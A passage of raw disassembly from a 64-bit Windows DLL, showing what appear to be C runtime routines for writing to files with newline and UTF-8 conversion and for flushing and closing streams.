   18000c0a8:	72 86                	jb     0x18000c030
   18000c0aa:	eb 08                	jmp    0x18000c0b4
   18000c0ac:	ff 15 be 2f 00 00    	call   *0x2fbe(%rip)        # 0x18000f070
   18000c0b2:	89 07                	mov    %eax,(%rdi)
   18000c0b4:	48 8b c7             	mov    %rdi,%rax
   18000c0b7:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   18000c0be:	00 
   18000c0bf:	48 33 cc             	xor    %rsp,%rcx
   18000c0c2:	e8 09 52 ff ff       	call   0x1800012d0
   18000c0c7:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   18000c0ce:	00 
   18000c0cf:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   18000c0d3:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   18000c0d7:	49 8b e3             	mov    %r11,%rsp
   18000c0da:	41 5e                	pop    %r14
   18000c0dc:	5f                   	pop    %rdi
   18000c0dd:	5e                   	pop    %rsi
   18000c0de:	c3                   	ret
   18000c0df:	cc                   	int3
   18000c0e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c0e5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000c0ea:	56                   	push   %rsi
   18000c0eb:	57                   	push   %rdi
   18000c0ec:	41 54                	push   %r12
   18000c0ee:	41 56                	push   %r14
   18000c0f0:	41 57                	push   %r15
   18000c0f2:	b8 70 14 00 00       	mov    $0x1470,%eax
   18000c0f7:	e8 34 10 00 00       	call   0x18000d130
   18000c0fc:	48 2b e0             	sub    %rax,%rsp
   18000c0ff:	48 8b 05 fa de 00 00 	mov    0xdefa(%rip),%rax        # 0x18001a000
   18000c106:	48 33 c4             	xor    %rsp,%rax
   18000c109:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   18000c110:	00 
   18000c111:	4c 63 d2             	movslq %edx,%r10
   18000c114:	48 8b d9             	mov    %rcx,%rbx
   18000c117:	49 8b c2             	mov    %r10,%rax
   18000c11a:	45 8b f1             	mov    %r9d,%r14d
   18000c11d:	48 c1 f8 06          	sar    $0x6,%rax
   18000c121:	48 8d 0d a8 ef 00 00 	lea    0xefa8(%rip),%rcx        # 0x18001b0d0
   18000c128:	41 83 e2 3f          	and    $0x3f,%r10d
   18000c12c:	4d 03 f0             	add    %r8,%r14
   18000c12f:	4d 8b f8             	mov    %r8,%r15
   18000c132:	49 8b f8             	mov    %r8,%rdi
   18000c135:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000c139:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   18000c13d:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   18000c142:	33 c0                	xor    %eax,%eax
   18000c144:	48 89 03             	mov    %rax,(%rbx)
   18000c147:	89 43 08             	mov    %eax,0x8(%rbx)
   18000c14a:	4d 3b c6             	cmp    %r14,%r8
   18000c14d:	0f 83 d2 00 00 00    	jae    0x18000c225
   18000c153:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000c158:	49 3b fe             	cmp    %r14,%rdi
   18000c15b:	73 2c                	jae    0x18000c189
   18000c15d:	0f b7 07             	movzwl (%rdi),%eax
   18000c160:	48 83 c7 02          	add    $0x2,%rdi
   18000c164:	66 83 f8 0a          	cmp    $0xa,%ax
   18000c168:	75 0a                	jne    0x18000c174
   18000c16a:	66 41 c7 01 0d 00    	movw   $0xd,(%r9)
   18000c170:	49 83 c1 02          	add    $0x2,%r9
   18000c174:	66 41 89 01          	mov    %ax,(%r9)
   18000c178:	49 83 c1 02          	add    $0x2,%r9
   18000c17c:	48 8d 84 24 f8 06 00 	lea    0x6f8(%rsp),%rax
   18000c183:	00 
   18000c184:	4c 3b c8             	cmp    %rax,%r9
   18000c187:	72 cf                	jb     0x18000c158
   18000c189:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000c18f:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   18000c194:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000c19a:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000c19f:	4c 2b c8             	sub    %rax,%r9
   18000c1a2:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   18000c1a9:	00 
   18000c1aa:	48 8d 84 24 00 07 00 	lea    0x700(%rsp),%rax
   18000c1b1:	00 
   18000c1b2:	49 d1 f9             	sar    $1,%r9
   18000c1b5:	33 d2                	xor    %edx,%edx
   18000c1b7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c1bc:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   18000c1c1:	e8 56 c2 ff ff       	call   0x18000841c
   18000c1c6:	8b e8                	mov    %eax,%ebp
   18000c1c8:	85 c0                	test   %eax,%eax
   18000c1ca:	74 51                	je     0x18000c21d
   18000c1cc:	33 f6                	xor    %esi,%esi
   18000c1ce:	85 c0                	test   %eax,%eax
   18000c1d0:	74 38                	je     0x18000c20a
   18000c1d2:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   18000c1d7:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   18000c1de:	00 
   18000c1df:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000c1e5:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   18000c1ea:	8b ce                	mov    %esi,%ecx
   18000c1ec:	44 8b c5             	mov    %ebp,%r8d
   18000c1ef:	48 03 d1             	add    %rcx,%rdx
   18000c1f2:	44 2b c6             	sub    %esi,%r8d
   18000c1f5:	49 8b cc             	mov    %r12,%rcx
   18000c1f8:	ff 15 12 30 00 00    	call   *0x3012(%rip)        # 0x18000f210
   18000c1fe:	85 c0                	test   %eax,%eax
   18000c200:	74 1b                	je     0x18000c21d
   18000c202:	03 74 24 40          	add    0x40(%rsp),%esi
   18000c206:	3b f5                	cmp    %ebp,%esi
   18000c208:	72 c8                	jb     0x18000c1d2
   18000c20a:	8b c7                	mov    %edi,%eax
   18000c20c:	41 2b c7             	sub    %r15d,%eax
   18000c20f:	89 43 04             	mov    %eax,0x4(%rbx)
   18000c212:	49 3b fe             	cmp    %r14,%rdi
   18000c215:	0f 82 38 ff ff ff    	jb     0x18000c153
   18000c21b:	eb 08                	jmp    0x18000c225
   18000c21d:	ff 15 4d 2e 00 00    	call   *0x2e4d(%rip)        # 0x18000f070
   18000c223:	89 03                	mov    %eax,(%rbx)
   18000c225:	48 8b c3             	mov    %rbx,%rax
   18000c228:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   18000c22f:	00 
   18000c230:	48 33 cc             	xor    %rsp,%rcx
   18000c233:	e8 98 50 ff ff       	call   0x1800012d0
   18000c238:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   18000c23f:	00 
   18000c240:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   18000c244:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   18000c248:	49 8b e3             	mov    %r11,%rsp
   18000c24b:	41 5f                	pop    %r15
   18000c24d:	41 5e                	pop    %r14
   18000c24f:	41 5c                	pop    %r12
   18000c251:	5f                   	pop    %rdi
   18000c252:	5e                   	pop    %rsi
   18000c253:	c3                   	ret
   18000c254:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000c259:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000c25e:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000c262:	56                   	push   %rsi
   18000c263:	41 54                	push   %r12
   18000c265:	41 55                	push   %r13
   18000c267:	41 56                	push   %r14
   18000c269:	41 57                	push   %r15
   18000c26b:	48 83 ec 30          	sub    $0x30,%rsp
   18000c26f:	49 8b d9             	mov    %r9,%rbx
   18000c272:	45 8b e8             	mov    %r8d,%r13d
   18000c275:	48 63 f1             	movslq %ecx,%rsi
   18000c278:	83 fe fe             	cmp    $0xfffffffe,%esi
   18000c27b:	75 2d                	jne    0x18000c2aa
   18000c27d:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   18000c282:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   18000c287:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   18000c28c:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   18000c293:	00 
   18000c294:	83 c8 ff             	or     $0xffffffff,%eax
   18000c297:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000c29c:	48 83 c4 30          	add    $0x30,%rsp
   18000c2a0:	41 5f                	pop    %r15
   18000c2a2:	41 5e                	pop    %r14
   18000c2a4:	41 5d                	pop    %r13
   18000c2a6:	41 5c                	pop    %r12
   18000c2a8:	5e                   	pop    %rsi
   18000c2a9:	c3                   	ret
   18000c2aa:	85 c9                	test   %ecx,%ecx
   18000c2ac:	78 0f                	js     0x18000c2bd
   18000c2ae:	3b 35 1c f2 00 00    	cmp    0xf21c(%rip),%esi        # 0x18001b4d0
   18000c2b4:	73 07                	jae    0x18000c2bd
   18000c2b6:	b8 01 00 00 00       	mov    $0x1,%eax
   18000c2bb:	eb 02                	jmp    0x18000c2bf
   18000c2bd:	33 c0                	xor    %eax,%eax
   18000c2bf:	85 c0                	test   %eax,%eax
   18000c2c1:	75 33                	jne    0x18000c2f6
   18000c2c3:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   18000c2c8:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   18000c2cd:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   18000c2d2:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   18000c2d9:	00 
   18000c2da:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   18000c2df:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000c2e5:	45 33 c9             	xor    %r9d,%r9d
   18000c2e8:	45 33 c0             	xor    %r8d,%r8d
   18000c2eb:	33 d2                	xor    %edx,%edx
   18000c2ed:	33 c9                	xor    %ecx,%ecx
   18000c2ef:	e8 a0 9b ff ff       	call   0x180005e94
   18000c2f4:	eb 9e                	jmp    0x18000c294
   18000c2f6:	48 8b c6             	mov    %rsi,%rax
   18000c2f9:	4c 8b fe             	mov    %rsi,%r15
   18000c2fc:	49 c1 ff 06          	sar    $0x6,%r15
   18000c300:	48 8d 0d c9 ed 00 00 	lea    0xedc9(%rip),%rcx        # 0x18001b0d0
   18000c307:	83 e0 3f             	and    $0x3f,%eax
   18000c30a:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   18000c30e:	4a 8b 04 f9          	mov    (%rcx,%r15,8),%rax
   18000c312:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   18000c318:	74 a9                	je     0x18000c2c3
   18000c31a:	8b ce                	mov    %esi,%ecx
   18000c31c:	e8 63 f4 ff ff       	call   0x18000b784
   18000c321:	41 83 ce ff          	or     $0xffffffff,%r14d
   18000c325:	48 8d 05 a4 ed 00 00 	lea    0xeda4(%rip),%rax        # 0x18001b0d0
   18000c32c:	4a 8b 04 f8          	mov    (%rax,%r15,8),%rax
   18000c330:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   18000c336:	75 15                	jne    0x18000c34d
   18000c338:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   18000c33c:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   18000c343:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   18000c347:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   18000c34b:	eb 15                	jmp    0x18000c362
   18000c34d:	4c 8b cb             	mov    %rbx,%r9
   18000c350:	45 8b c5             	mov    %r13d,%r8d
   18000c353:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   18000c358:	8b ce                	mov    %esi,%ecx
   18000c35a:	e8 15 00 00 00       	call   0x18000c374
   18000c35f:	44 8b f0             	mov    %eax,%r14d
   18000c362:	8b ce                	mov    %esi,%ecx
   18000c364:	e8 43 f4 ff ff       	call   0x18000b7ac
   18000c369:	41 8b c6             	mov    %r14d,%eax
   18000c36c:	e9 26 ff ff ff       	jmp    0x18000c297
   18000c371:	cc                   	int3
   18000c372:	cc                   	int3
   18000c373:	cc                   	int3
   18000c374:	40 55                	rex push %rbp
   18000c376:	53                   	push   %rbx
   18000c377:	56                   	push   %rsi
   18000c378:	57                   	push   %rdi
   18000c379:	41 54                	push   %r12
   18000c37b:	41 55                	push   %r13
   18000c37d:	41 56                	push   %r14
   18000c37f:	41 57                	push   %r15
   18000c381:	48 8b ec             	mov    %rsp,%rbp
   18000c384:	48 83 ec 68          	sub    $0x68,%rsp
   18000c388:	33 ff                	xor    %edi,%edi
   18000c38a:	45 8b f0             	mov    %r8d,%r14d
   18000c38d:	4c 63 e9             	movslq %ecx,%r13
   18000c390:	49 8b d9             	mov    %r9,%rbx
   18000c393:	48 8b f2             	mov    %rdx,%rsi
   18000c396:	45 85 c0             	test   %r8d,%r8d
   18000c399:	0f 84 f1 02 00 00    	je     0x18000c690
   18000c39f:	48 85 d2             	test   %rdx,%rdx
   18000c3a2:	75 37                	jne    0x18000c3db
   18000c3a4:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   18000c3a9:	45 33 c0             	xor    %r8d,%r8d
   18000c3ac:	41 89 79 34          	mov    %edi,0x34(%r9)
   18000c3b0:	33 d2                	xor    %edx,%edx
   18000c3b2:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   18000c3b7:	33 c9                	xor    %ecx,%ecx
   18000c3b9:	41 c7 41 2c 16 00 00 	movl   $0x16,0x2c(%r9)
   18000c3c0:	00 
   18000c3c1:	45 33 c9             	xor    %r9d,%r9d
   18000c3c4:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   18000c3c9:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000c3ce:	e8 c1 9a ff ff       	call   0x180005e94
   18000c3d3:	83 c8 ff             	or     $0xffffffff,%eax
   18000c3d6:	e9 b7 02 00 00       	jmp    0x18000c692
   18000c3db:	49 8b c5             	mov    %r13,%rax
   18000c3de:	48 8d 0d eb ec 00 00 	lea    0xeceb(%rip),%rcx        # 0x18001b0d0
   18000c3e5:	83 e0 3f             	and    $0x3f,%eax
   18000c3e8:	4d 8b e5             	mov    %r13,%r12
   18000c3eb:	49 c1 fc 06          	sar    $0x6,%r12
   18000c3ef:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   18000c3f3:	4a 8b 0c e1          	mov    (%rcx,%r12,8),%rcx
   18000c3f7:	42 8a 44 f9 39       	mov    0x39(%rcx,%r15,8),%al
   18000c3fc:	88 45 c8             	mov    %al,-0x38(%rbp)
   18000c3ff:	fe c8                	dec    %al
   18000c401:	3c 01                	cmp    $0x1,%al
   18000c403:	77 09                	ja     0x18000c40e
   18000c405:	41 8b c6             	mov    %r14d,%eax
   18000c408:	f7 d0                	not    %eax
   18000c40a:	a8 01                	test   $0x1,%al
   18000c40c:	74 96                	je     0x18000c3a4
   18000c40e:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   18000c414:	74 0e                	je     0x18000c424
   18000c416:	33 d2                	xor    %edx,%edx
   18000c418:	41 8b cd             	mov    %r13d,%ecx
   18000c41b:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   18000c41f:	e8 4c 05 00 00       	call   0x18000c970
   18000c424:	41 8b cd             	mov    %r13d,%ecx
   18000c427:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   18000c42b:	e8 6c 03 00 00       	call   0x18000c79c
   18000c430:	33 c9                	xor    %ecx,%ecx
   18000c432:	4c 8d 05 97 ec 00 00 	lea    0xec97(%rip),%r8        # 0x18001b0d0
   18000c439:	85 c0                	test   %eax,%eax
   18000c43b:	0f 84 1b 01 00 00    	je     0x18000c55c
   18000c441:	4b 8b 04 e0          	mov    (%r8,%r12,8),%rax
   18000c445:	42 38 4c f8 38       	cmp    %cl,0x38(%rax,%r15,8)
   18000c44a:	0f 8d 0c 01 00 00    	jge    0x18000c55c
   18000c450:	38 4b 28             	cmp    %cl,0x28(%rbx)
   18000c453:	75 11                	jne    0x18000c466
   18000c455:	48 8b cb             	mov    %rbx,%rcx
   18000c458:	e8 e3 96 ff ff       	call   0x180005b40
   18000c45d:	33 c9                	xor    %ecx,%ecx
   18000c45f:	4c 8d 05 6a ec 00 00 	lea    0xec6a(%rip),%r8        # 0x18001b0d0
   18000c466:	48 8b 43 18          	mov    0x18(%rbx),%rax
   18000c46a:	48 39 88 38 01 00 00 	cmp    %rcx,0x138(%rax)
   18000c471:	75 0f                	jne    0x18000c482
   18000c473:	4b 8b 04 e0          	mov    (%r8,%r12,8),%rax
   18000c477:	42 38 4c f8 39       	cmp    %cl,0x39(%rax,%r15,8)
   18000c47c:	0f 84 da 00 00 00    	je     0x18000c55c
   18000c482:	89 4d f0             	mov    %ecx,-0x10(%rbp)
   18000c485:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   18000c489:	4b 8b 0c e0          	mov    (%r8,%r12,8),%rcx
   18000c48d:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   18000c492:	ff 15 88 2d 00 00    	call   *0x2d88(%rip)        # 0x18000f220
   18000c498:	85 c0                	test   %eax,%eax
   18000c49a:	0f 84 b5 00 00 00    	je     0x18000c555
   18000c4a0:	0f be 4d c8          	movsbl -0x38(%rbp),%ecx
   18000c4a4:	85 c9                	test   %ecx,%ecx
   18000c4a6:	0f 84 86 00 00 00    	je     0x18000c532
   18000c4ac:	83 e9 01             	sub    $0x1,%ecx
   18000c4af:	74 09                	je     0x18000c4ba
   18000c4b1:	83 f9 01             	cmp    $0x1,%ecx
   18000c4b4:	0f 85 50 01 00 00    	jne    0x18000c60a
   18000c4ba:	4e 8d 24 36          	lea    (%rsi,%r14,1),%r12
   18000c4be:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   18000c4c2:	4c 8b fe             	mov    %rsi,%r15
   18000c4c5:	49 3b f4             	cmp    %r12,%rsi
   18000c4c8:	0f 83 32 01 00 00    	jae    0x18000c600
   18000c4ce:	44 8b 75 d4          	mov    -0x2c(%rbp),%r14d
   18000c4d2:	41 0f b7 07          	movzwl (%r15),%eax
   18000c4d6:	0f b7 c8             	movzwl %ax,%ecx
   18000c4d9:	66 89 45 c8          	mov    %ax,-0x38(%rbp)
   18000c4dd:	e8 96 04 00 00       	call   0x18000c978
   18000c4e2:	0f b7 4d c8          	movzwl -0x38(%rbp),%ecx
   18000c4e6:	66 3b c1             	cmp    %cx,%ax
   18000c4e9:	75 39                	jne    0x18000c524
   18000c4eb:	41 83 c6 02          	add    $0x2,%r14d
   18000c4ef:	44 89 75 d4          	mov    %r14d,-0x2c(%rbp)
   18000c4f3:	66 83 f9 0a          	cmp    $0xa,%cx
   18000c4f7:	75 1d                	jne    0x18000c516
   18000c4f9:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000c4fe:	e8 75 04 00 00       	call   0x18000c978
   18000c503:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000c508:	66 3b c1             	cmp    %cx,%ax
   18000c50b:	75 17                	jne    0x18000c524
   18000c50d:	41 ff c6             	inc    %r14d
   18000c510:	44 89 75 d4          	mov    %r14d,-0x2c(%rbp)
   18000c514:	ff c7                	inc    %edi
   18000c516:	49 83 c7 02          	add    $0x2,%r15
   18000c51a:	4d 3b fc             	cmp    %r12,%r15
   18000c51d:	72 b3                	jb     0x18000c4d2
   18000c51f:	e9 dc 00 00 00       	jmp    0x18000c600
   18000c524:	ff 15 46 2b 00 00    	call   *0x2b46(%rip)        # 0x18000f070
   18000c52a:	89 45 d0             	mov    %eax,-0x30(%rbp)
   18000c52d:	e9 ce 00 00 00       	jmp    0x18000c600
   18000c532:	45 8b ce             	mov    %r14d,%r9d
   18000c535:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000c53a:	4c 8b c6             	mov    %rsi,%r8
   18000c53d:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000c541:	41 8b d5             	mov    %r13d,%edx
   18000c544:	e8 df f4 ff ff       	call   0x18000ba28
   18000c549:	f2 0f 10 00          	movsd  (%rax),%xmm0
   18000c54d:	8b 78 08             	mov    0x8(%rax),%edi
   18000c550:	e9 b0 00 00 00       	jmp    0x18000c605
   18000c555:	4c 8d 05 74 eb 00 00 	lea    0xeb74(%rip),%r8        # 0x18001b0d0
   18000c55c:	49 8b cd             	mov    %r13,%rcx
   18000c55f:	49 8b c5             	mov    %r13,%rax
   18000c562:	48 c1 f8 06          	sar    $0x6,%rax
   18000c566:	83 e1 3f             	and    $0x3f,%ecx
   18000c569:	49 8b 14 c0          	mov    (%r8,%rax,8),%rdx
   18000c56d:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000c571:	40 38 7c ca 38       	cmp    %dil,0x38(%rdx,%rcx,8)
   18000c576:	7d 55                	jge    0x18000c5cd
   18000c578:	0f be 4d c8          	movsbl -0x38(%rbp),%ecx
   18000c57c:	85 c9                	test   %ecx,%ecx
   18000c57e:	74 36                	je     0x18000c5b6
   18000c580:	83 e9 01             	sub    $0x1,%ecx
   18000c583:	74 1d                	je     0x18000c5a2
   18000c585:	83 f9 01             	cmp    $0x1,%ecx
   18000c588:	0f 85 83 00 00 00    	jne    0x18000c611
   18000c58e:	45 8b ce             	mov    %r14d,%r9d
   18000c591:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000c595:	4c 8b c6             	mov    %rsi,%r8
   18000c598:	41 8b d5             	mov    %r13d,%edx
   18000c59b:	e8 24 fa ff ff       	call   0x18000bfc4
   18000c5a0:	eb a7                	jmp    0x18000c549
   18000c5a2:	45 8b ce             	mov    %r14d,%r9d
   18000c5a5:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000c5a9:	4c 8b c6             	mov    %rsi,%r8
   18000c5ac:	41 8b d5             	mov    %r13d,%edx
   18000c5af:	e8 2c fb ff ff       	call   0x18000c0e0
   18000c5b4:	eb 93                	jmp    0x18000c549
   18000c5b6:	45 8b ce             	mov    %r14d,%r9d
   18000c5b9:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000c5bd:	4c 8b c6             	mov    %rsi,%r8
   18000c5c0:	41 8b d5             	mov    %r13d,%edx
   18000c5c3:	e8 f4 f8 ff ff       	call   0x18000bebc
   18000c5c8:	e9 7c ff ff ff       	jmp    0x18000c549
   18000c5cd:	48 8b 4c ca 28       	mov    0x28(%rdx,%rcx,8),%rcx
   18000c5d2:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   18000c5d6:	33 c0                	xor    %eax,%eax
   18000c5d8:	48 8b d6             	mov    %rsi,%rdx
   18000c5db:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   18000c5e0:	45 8b c6             	mov    %r14d,%r8d
   18000c5e3:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   18000c5e7:	89 45 d8             	mov    %eax,-0x28(%rbp)
   18000c5ea:	ff 15 20 2c 00 00    	call   *0x2c20(%rip)        # 0x18000f210
   18000c5f0:	85 c0                	test   %eax,%eax
   18000c5f2:	75 09                	jne    0x18000c5fd
   18000c5f4:	ff 15 76 2a 00 00    	call   *0x2a76(%rip)        # 0x18000f070
   18000c5fa:	89 45 d0             	mov    %eax,-0x30(%rbp)
   18000c5fd:	8b 7d d8             	mov    -0x28(%rbp),%edi
   18000c600:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   18000c605:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   18000c60a:	4c 8d 05 bf ea 00 00 	lea    0xeabf(%rip),%r8        # 0x18001b0d0
   18000c611:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   18000c615:	48 c1 e8 20          	shr    $0x20,%rax
   18000c619:	85 c0                	test   %eax,%eax
   18000c61b:	75 6c                	jne    0x18000c689
   18000c61d:	8b 45 e0             	mov    -0x20(%rbp),%eax
   18000c620:	85 c0                	test   %eax,%eax
   18000c622:	74 2c                	je     0x18000c650
   18000c624:	83 f8 05             	cmp    $0x5,%eax
   18000c627:	75 17                	jne    0x18000c640
   18000c629:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   18000c62d:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   18000c634:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   18000c638:	89 43 34             	mov    %eax,0x34(%rbx)
   18000c63b:	e9 93 fd ff ff       	jmp    0x18000c3d3
   18000c640:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   18000c643:	48 8b d3             	mov    %rbx,%rdx
   18000c646:	e8 61 9a ff ff       	call   0x1800060ac
   18000c64b:	e9 83 fd ff ff       	jmp    0x18000c3d3
   18000c650:	49 8b cd             	mov    %r13,%rcx
   18000c653:	49 8b c5             	mov    %r13,%rax
   18000c656:	48 c1 f8 06          	sar    $0x6,%rax
   18000c65a:	83 e1 3f             	and    $0x3f,%ecx
   18000c65d:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000c661:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000c665:	f6 44 c8 38 40       	testb  $0x40,0x38(%rax,%rcx,8)
   18000c66a:	74 05                	je     0x18000c671
   18000c66c:	80 3e 1a             	cmpb   $0x1a,(%rsi)
   18000c66f:	74 1f                	je     0x18000c690
   18000c671:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   18000c675:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   18000c679:	c7 43 2c 1c 00 00 00 	movl   $0x1c,0x2c(%rbx)
   18000c680:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   18000c684:	e9 4a fd ff ff       	jmp    0x18000c3d3
   18000c689:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   18000c68c:	2b c7                	sub    %edi,%eax
   18000c68e:	eb 02                	jmp    0x18000c692
   18000c690:	33 c0                	xor    %eax,%eax
   18000c692:	48 83 c4 68          	add    $0x68,%rsp
   18000c696:	41 5f                	pop    %r15
   18000c698:	41 5e                	pop    %r14
   18000c69a:	41 5d                	pop    %r13
   18000c69c:	41 5c                	pop    %r12
   18000c69e:	5f                   	pop    %rdi
   18000c69f:	5e                   	pop    %rsi
   18000c6a0:	5b                   	pop    %rbx
   18000c6a1:	5d                   	pop    %rbp
   18000c6a2:	c3                   	ret
   18000c6a3:	cc                   	int3
   18000c6a4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000c6a9:	57                   	push   %rdi
   18000c6aa:	48 83 ec 30          	sub    $0x30,%rsp
   18000c6ae:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   18000c6b3:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000c6b8:	e8 5b a2 ff ff       	call   0x180006918
   18000c6bd:	90                   	nop
   18000c6be:	bb 03 00 00 00       	mov    $0x3,%ebx
   18000c6c3:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   18000c6c7:	3b 1d 3b ee 00 00    	cmp    0xee3b(%rip),%ebx        # 0x18001b508
   18000c6cd:	74 6e                	je     0x18000c73d
   18000c6cf:	48 63 fb             	movslq %ebx,%rdi
   18000c6d2:	48 8b 05 37 ee 00 00 	mov    0xee37(%rip),%rax        # 0x18001b510
   18000c6d9:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   18000c6dd:	48 85 c0             	test   %rax,%rax
   18000c6e0:	75 02                	jne    0x18000c6e4
   18000c6e2:	eb 55                	jmp    0x18000c739
   18000c6e4:	8b 40 14             	mov    0x14(%rax),%eax
   18000c6e7:	90                   	nop
   18000c6e8:	c1 e8 0d             	shr    $0xd,%eax
   18000c6eb:	a8 01                	test   $0x1,%al
   18000c6ed:	74 19                	je     0x18000c708
   18000c6ef:	48 8b 0d 1a ee 00 00 	mov    0xee1a(%rip),%rcx        # 0x18001b510
   18000c6f6:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   18000c6fa:	e8 dd 03 00 00       	call   0x18000cadc
   18000c6ff:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000c702:	74 04                	je     0x18000c708
   18000c704:	ff 44 24 20          	incl   0x20(%rsp)
   18000c708:	48 8b 05 01 ee 00 00 	mov    0xee01(%rip),%rax        # 0x18001b510
   18000c70f:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   18000c713:	48 83 c1 30          	add    $0x30,%rcx
   18000c717:	ff 15 9b 29 00 00    	call   *0x299b(%rip)        # 0x18000f0b8
   18000c71d:	48 8b 0d ec ed 00 00 	mov    0xedec(%rip),%rcx        # 0x18001b510
   18000c724:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   18000c728:	e8 43 a3 ff ff       	call   0x180006a70
   18000c72d:	48 8b 05 dc ed 00 00 	mov    0xeddc(%rip),%rax        # 0x18001b510
   18000c734:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   18000c739:	ff c3                	inc    %ebx
   18000c73b:	eb 86                	jmp    0x18000c6c3
   18000c73d:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000c742:	e8 25 a2 ff ff       	call   0x18000696c
   18000c747:	8b 44 24 20          	mov    0x20(%rsp),%eax
   18000c74b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   18000c750:	48 83 c4 30          	add    $0x30,%rsp
   18000c754:	5f                   	pop    %rdi
   18000c755:	c3                   	ret
   18000c756:	cc                   	int3
   18000c757:	cc                   	int3
   18000c758:	40 53                	rex push %rbx
   18000c75a:	48 83 ec 20          	sub    $0x20,%rsp
   18000c75e:	8b 41 14             	mov    0x14(%rcx),%eax
